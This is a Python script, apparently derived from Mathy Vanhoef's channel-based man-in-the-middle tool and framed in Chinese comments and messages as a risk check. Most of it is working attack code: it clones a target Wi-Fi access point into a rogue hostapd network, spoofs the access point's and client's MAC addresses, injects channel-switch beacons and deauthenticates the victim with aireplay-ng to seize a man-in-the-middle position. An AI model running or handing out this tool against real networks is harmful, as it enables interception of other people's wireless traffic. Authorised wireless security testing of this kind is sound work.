#!/usr/bin/env python3

import textwrap
from select import select
import atexit
import subprocess
import heapq
import argparse
import time
import struct
import socket
import os
import sys
from libwifi import *
from datetime import datetime
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


global_log_level = INFO
stop_flag = False
detect_result = 'NULL'


def print_rx(level, name, p, color=None, suffix=None):
    if p[Dot11].type == 1:
        return
    if color is None and (Dot11Deauth in p or Dot11Disas in p):
        color = "orange"
    log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1,
        dot11_to_str(p), suffix if suffix else ""), color=color)

# 紀錄網路的 config


class NetworkConfig():
    def __init__(self, group, password):
        self.ssid = None
        self.real_channel = None
        self.group_cipher = None
        self.wpavers = 0
        self.pairwise_ciphers = set()
        self.akms = set()
        self.wmmenabled = 0
        self.capab = 0
        self.group = group
        self.password = password

    # 檢查 beacon frame MAC層是否包含RSNE訊息，沒有就代表非使用RSN網路(為WEP)
    def is_wparsn(self):
        return not self.group_cipher is None and self.wpavers > 0 and \
            len(self.pairwise_ciphers) > 0 and len(self.akms) > 0

    # 解析 RSN 內容
    def parse_wparsn(self, wparsn):
        # 群組加密演算法
        self.group_cipher = ord(wparsn.decode('unicode_escape')[5])
        # 處理 c 語言的struct, H: unsigned short return python integer; <: little-endian
        num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
        pos = wparsn[8:]
        for i in range(num_pairwise):
            self.pairwise_ciphers.add(ord(pos.decode('unicode_escape')[3]))
            pos = pos[4:]
        # 取出 akm 數量, (authentication and key management, akm)
        num_akm = struct.unpack("<H", pos[:2])[0]
        # 取出 akm suite list
        pos = pos[2:]
        for i in range(num_akm):
            self.akms.add(ord(pos.decode('unicode_escape')[3]))
            pos = pos[4:]
        # RSN capabilities
        if len(pos) >= 2:
            self.capab = struct.unpack("<H", pos[:2])[0]

    def from_beacon(self, p):
        el = p[Dot11Elt]
        while isinstance(el, Dot11Elt):
            if el.ID == IEEE_TLV_TYPE_SSID:
                self.ssid = el.info.decode('unicode_escape')
            elif el.ID == IEEE_TLV_TYPE_CHANNEL:
                self.real_channel = ord(el.info.decode('unicode_escape')[0])
            elif el.ID == IEEE_TLV_TYPE_RSN:
                # 有 RSN Info 為 WPA2
                self.parse_wparsn(el.info)
                self.wpavers |= 2
            elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x01":
                # Micrsoft OUI: 00 50 f2; OUI Type: 01 (WPA)
                self.parse_wparsn(el.info[4:])
                self.wpavers |= 1
            elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x02":
                # Micrsoft OUI: 00 50 f2; OUI Type: 02 (WPA)
                self.wmmenabled = 1

            el = el.payload

    def find_rogue_channel(self):
        # 強盜 AP 頻道不是在 1 就是 11
        self.rogue_channel = 1 if self.real_channel >= 6 else 11

    # hostapd.confg寫檔
    def write_config(self, iface):
        TEMPLATE = """
ctrl_interface={locate}
ctrl_interface_group=root

interface={iface}
ssid={ssid}
channel={channel}

wpa={wpaver}
wpa_key_mgmt={akms}
wpa_pairwise={pairwise}
rsn_pairwise={pairwise}

wmm_enabled={wmmenabled}
hw_mode=g
auth_algs=3
wpa_passphrase={password}"""
        akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
        ciphers2str = {2: "TKIP", 4: "CCMP"}
        now_path = os.path.dirname(os.path.realpath(__file__))
        return TEMPLATE.format(
            locate=os.path.realpath(os.path.join(
                now_path, "../hostapd/hostapd_ctrl")),
            iface=iface,
            ssid=self.ssid,
            channel=self.rogue_channel,
            wpaver=self.wpavers,
            akms=" ".join([akm2str[idx] for idx in self.akms]),
            pairwise=" ".join([ciphers2str[idx]
                              for idx in self.pairwise_ciphers]),
            ptksa_counters=(self.capab & 0b001100) >> 2,
            gtksa_counters=(self.capab & 0b110000) >> 4,
            wmmadvertised=int(self.group),
            wmmenabled=self.wmmenabled,
            password=str(self.password))


class ClientState():
    Initializing, Connecting, GotMitm, Connected, Failed = range(5)

    def __init__(self, macaddr):
        self.macaddr = macaddr
        self.reset()

    def reset(self):
        self.state = ClientState.Initializing
        self.assocreq = None

    def mark_got_mitm(self):
        if self.state <= ClientState.Connecting:
            self.state = ClientState.GotMitm
            log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
                color="green", showtime=False)

    def mark_connected(self):
        global stop_flag
        global detect_result
        if self.state >= ClientState.GotMitm:
            self.state = ClientState.Connected
            log(WARNING, "檢測結果: 存在基於頻道中間人攻擊風險。", showtime=False)
            stop_flag = True
            detect_result = 'R2'
        else:
            self.state = ClientState.Failed
            log(STATUS, "檢測結果: 無存在基於頻道中間人攻擊風險。", color="green", showtime=False)
            stop_flag = True
            detect_result = 'R1'

    def update_state(self, state):
        log(DEBUG, "Client %s moved to state %d" %
            (self.macaddr, state), showtime=False)
        self.state = state

    def is_state(self, state):
        return self.state == state


class FakeAP():
    def __init__(self, nic_real_mon, nic_real_clientack, nic_rogue_ap, nic_rogue_mon, ssid, password, group, clientmac=None, dumpfile=None, cont_csa=False):
        self.nic_real_mon = nic_real_mon
        self.nic_real_clientack = nic_real_clientack
        self.nic_rogue_ap = nic_rogue_ap
        self.nic_rogue_mon = nic_rogue_mon
        self.dumpfile = dumpfile
        self.ssid = ssid
        self.password = password
        self.group = group
        self.beacon = None
        self.apmac = None
        self.netconfig = None
        self.hostapd = None
        self.hostapd_log = None
        self.script_path = os.path.dirname(os.path.realpath(__file__))

        # This is set in case of targeted attacks
        self.clientmac = None if clientmac is None else clientmac.replace(
            "-", ":").lower()

        self.sock_real = None
        self.sock_rogue = None
        self.clients = dict()
        self.disas_queue = []
        self.continuous_csa = cont_csa
        # 用來監控介面是否在適當的頻道中
        self.last_real_beacon = None
        self.last_rogue_beacon = None

    def find_beacon(self, ssid):
        ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(
            Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
        if ps is None or len(ps) < 1:
            log(STATUS, "Searching for target network on other channels")
            for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
                self.sock_real.set_channel(chan)
                log(DEBUG, "Listening on channel %d" % chan)
                ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(
                    Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
                if ps and len(ps) >= 1:
                    break
        if ps and len(ps) >= 1:
            actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
            self.sock_real.set_channel(actual_chan)
            self.beacon = ps[0]
            self.apmac = self.beacon.addr2

    def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
        newchannel = self.netconfig.rogue_channel
        beacon = self.beacon.copy()
        if target:
            beacon.addr1 = target

        for i in range(numbeacons):
            csabeacon = append_csa(beacon, newchannel, 2)
            self.sock_real.send(csabeacon, False, self.netconfig.real_channel)

            csabeacon = append_csa(beacon, newchannel, 1)
            self.sock_real.send(csabeacon, False, self.netconfig.real_channel)

        if not silent:
            log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (
                numbeacons, newchannel), color="green")

    def send_disas(self, macaddr):
        dot11 = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)
        disas = dot11/Dot11Disas(reason=0)
        self.sock_rogue.send(disas, True, self.netconfig.rogue_channel)
        log(STATUS, "Rogue channel: injected Disassociation to %s" %
            macaddr, color="green")

    def handle_rx_realchan(self):
        p, origin_p = self.sock_real.recv()

        if p == None:
            return

        if p.addr1 == self.apmac and p.addr2 == self.clientmac:
            if p.haslayer(Dot11Auth):
                print_rx(INFO, "Real channel ", p, color="orange")
                if self.clientmac == p.addr2:
                    log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)

                if p.addr2 in self.clients:
                    del self.clients[p.addr2]

                self.send_csa_beacon(target=p.addr2)
                subprocess.check_output(
                    ["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
                self.clients[p.addr2] = ClientState(p.addr2)
                self.clients[p.addr2].update_state(ClientState.Connecting)

            # Remember association request to save connection parameters
            elif p.haslayer(Dot11AssoReq):
                if p.addr2 in self.clients:
                    self.clients[p.addr2].assocreq = p

            elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
                if p.addr2 in self.clients:
                    del self.clients[p.addr2]

            elif get_eapol_msgnum(p) == 4:
                self.clients[p.addr2].mark_connected()

            elif self.clientmac is not None and self.clientmac == p.addr2:
                print_rx(INFO, "Real channel ", p)

            if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Connecting:
                log(WARNING, "Injecting Null frame so AP thinks client %s is awake." % p.addr2)

    def handle_rx_roguechan(self):
        p, origin_p = self.sock_rogue.recv()
        if p == None:
            return

        if p.addr1 == self.apmac and p.addr2 == self.clientmac:
            if p.haslayer(Dot11Auth):
                self.clients[p.addr2] = ClientState(p.addr2)
                self.clients[p.addr2].mark_got_mitm()
            if get_eapol_msgnum(p) == 4:
                self.clients[p.addr2].mark_connected()

        if p.addr1 == self.clientmac or p.addr2 == self.clientmac:
            print_rx(INFO, "Rogue channel", p)

    def handle_hostapd_out(self):
        line = self.hostapd.stdout.readline()
        if line == "":
            log(ERROR, "Rogue hostapd instances unexpectedly closed")
            quit(1)

        if line.startswith(">>>> ".encode()):
            log(DEBUG, "Rogue hostapd: " + line[5:].strip().decode())
        elif line.startswith(">>> ".encode()):
            log(DEBUG, "Rogue hostapd: " + line[4:].strip().decode())
        # This is a bit hacky but very usefull for quick debugging
        elif "fc=0xc0".encode() in line:
            log(DEBUG, "Rogue hostapd: " + line.strip().decode())
        elif "sta_remove".encode() in line or "Add STA".encode() in line or "disassoc cb".encode() in line or "disassocation: STA".encode() in line:
            log(DEBUG, "Rogue hostapd: " + line.strip().decode())
        else:
            log(DEBUG, "Rogue hostapd: " + line.strip().decode())
        self.hostapd_log.write(datetime.now().strftime(
            '[%H:%M:%S] ') + line.decode())

    def configure_interfaces(self):
        # 1. Configure monitor mode on interfaces
        subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
        subprocess.check_output(
            ["iwconfig", self.nic_real_mon, "mode", "monitor"])
        time.sleep(0.2)
        subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
        subprocess.check_output(
            ["iwconfig", self.nic_rogue_mon, "mode", "monitor"])

        # 2. 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
        if self.clientmac:
            subprocess.check_output(
                ["ifconfig", self.nic_real_clientack, "down"])
            call_macchanger(self.nic_real_clientack, self.clientmac)
        else:
            log(WARNING, "WARNING: Targeting ALL clients is not supported! Please provide a specific target using --target.")
            time.sleep(1)

        # 3. Put the interfaces up
        subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
        subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])

    # 主要執行 func.
    def run(self, strict_echo_test=False):
        global detect_result
        with open('result.txt', 'w') as f:
            f.write('NO')

        self.configure_interfaces()

        self.sock_real = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon,
                                    dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
        self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon,
                                     dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)

        self.find_beacon(self.ssid)
        if self.beacon is None:
            log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
            detect_result = 'E1'
            with open('result.txt', 'w') as f:
                f.write(str(detect_result))
            return

        # 將 wifi ap 的 beacon 訊息紀錄，用來產生 hostapd.conf
        self.netconfig = NetworkConfig(self.group, self.password)
        self.netconfig.from_beacon(self.beacon)
        if not self.netconfig.is_wparsn():
            log(ERROR, "裝置目前連接的網路，使用 WEP 協議。")
            detect_result = 'E2'
            with open('result.txt', 'w') as f:
                f.write(str(detect_result))
            return
        elif self.netconfig.real_channel > 13:
            log(WARNING, "偵測到裝置目前連接之網路為 5G 網路，請確保所使用的 rouge_ap 網卡為支援 5G 網路之網卡。")
            detect_result = 'E2'
            with open('result.txt', 'w') as f:
                f.write(str(detect_result))

        self.netconfig.find_rogue_channel()
        self.sock_rogue.set_channel(self.netconfig.rogue_channel)
        self.sock_real.set_channel(self.netconfig.real_channel)

        log(STATUS, "Target network %s detected on channel %d" %
            (self.apmac, self.netconfig.real_channel), color="green")
        log(STATUS, "Will create rogue AP on channel %d" %
            self.netconfig.rogue_channel, color="green")

        # 將強盜 AP 的 MAC addr. 設成原始 AP 的 MAC addr.
        log(STATUS, "Setting MAC address of %s to %s" %
            (self.nic_rogue_ap, self.apmac))
        set_mac_address(self.nic_rogue_ap, self.apmac)

        if self.nic_real_clientack:
            subprocess.check_output(
                ["ifconfig", self.nic_real_clientack, "down"])
            subprocess.check_output(
                ["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
            subprocess.check_output(
                ["ifconfig", self.nic_real_clientack, "up"])

        with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_fakeap.conf")), "w") as fp:
            fp.write(self.netconfig.write_config(self.nic_rogue_ap))
        self.hostapd = subprocess.Popen("hostapd ../hostapd/hostapd_fakeap.conf -dd -K",
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        self.hostapd_log = open("hostapd_fakeap.log", "w")
        log(STATUS, "Giving the rogue hostapd one second to initialize ...")
        time.sleep(10)

        # Inject some CSA beacons to push victims to our channel
        self.send_csa_beacon(numbeacons=4)
        subprocess.check_output(
            ["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])

        # deauthenticated 所有 client端，讓 AP 端重新四次交握
        subprocess.call(["aireplay-ng", "-0", "10", "-a",
                        self.apmac, "-c", self.clientmac, self.nic_real_mon])

        self.last_real_beacon = time.time()
        self.last_rogue_beacon = time.time()
        nextbeacon = time.time() + 0.01
        while True:
            sel = select([self.sock_real, self.sock_rogue, self.hostapd.stdout], [], [], 0.1)
            if self.sock_real in sel[0]:
                self.handle_rx_realchan()
            if self.sock_rogue in sel[0]:
                self.handle_rx_roguechan()
            if self.hostapd.stdout in sel[0]:
                self.handle_hostapd_out()

            while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
                self.send_disas(self.disas_queue.pop()[1])

            if self.continuous_csa and nextbeacon <= time.time():
                self.send_csa_beacon(silent=True)
                subprocess.check_output(
                    ["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
                nextbeacon += 0.10

            if self.last_real_beacon + 2 < time.time():
                log(WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
                self.last_real_beacon = time.time()
            if self.last_rogue_beacon + 2 < time.time():
                log(WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
                self.last_rogue_beacon = time.time()
            if stop_flag:
                break

        if stop_flag:
            with open('result.txt', 'w') as f:
                f.write(str(detect_result))
            return

    def stop(self):
        log(STATUS, "Closing hostapd and cleaning up ...")
        if self.hostapd:
            self.hostapd.terminate()
            self.hostapd.wait()
        if self.hostapd_log:
            self.hostapd_log.close()
        if self.sock_real:
            self.sock_real.close()
        if self.sock_rogue:
            self.sock_rogue.close()

        subprocess.call(["ifconfig", self.nic_real_clientack, "down"])
        subprocess.call(["ifconfig", self.nic_rogue_ap, "down"])

        subprocess.call(["macchanger", "-p", self.nic_real_clientack])
        subprocess.call(["macchanger", "-p", self.nic_rogue_ap])

        subprocess.call(["ifconfig", self.nic_real_clientack, "up"])
        subprocess.call(["ifconfig", self.nic_rogue_ap, "up"])


def cleanup():
    attack.stop()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter)
    # 必要的參數
    parser.add_argument(
        "nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
    parser.add_argument(
        "nic_real_clientack", help="Wireless monitor interface that will station on the channel of the target AP.")
    parser.add_argument(
        "nic_rogue_mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
    parser.add_argument(
        "nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
    parser.add_argument("ssid", help="The SSID of the network to attack.")
    parser.add_argument(
        "password", help="The password of the network to attack.")

    # 其他參數
    parser.add_argument(
        "-t", "--target", help="Specifically target the client with the given MAC address.")
    parser.add_argument(
        "-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
    parser.add_argument("-d", "--debug", action="count",
                        help="increase output verbosity", default=0)
    parser.add_argument(
        "--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
    parser.add_argument("--continuous-csa", action='store_true')
    parser.add_argument("--group", action='store_true')

    args = parser.parse_args()

    global_log_level = max(ALL, global_log_level - args.debug)
    set_global_log_level2(max(ALL, global_log_level - args.debug))

    print("\n\t===[ channel-based MitM position by Mathy Vanhoef ]====\n")
    attack = FakeAP(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap,
                    args.nic_rogue_mon, args.ssid, args.password, args.group, args.target, args.dump, args.continuous_csa)
    atexit.register(cleanup)
    attack.run(strict_echo_test=args.strict_echo_test)
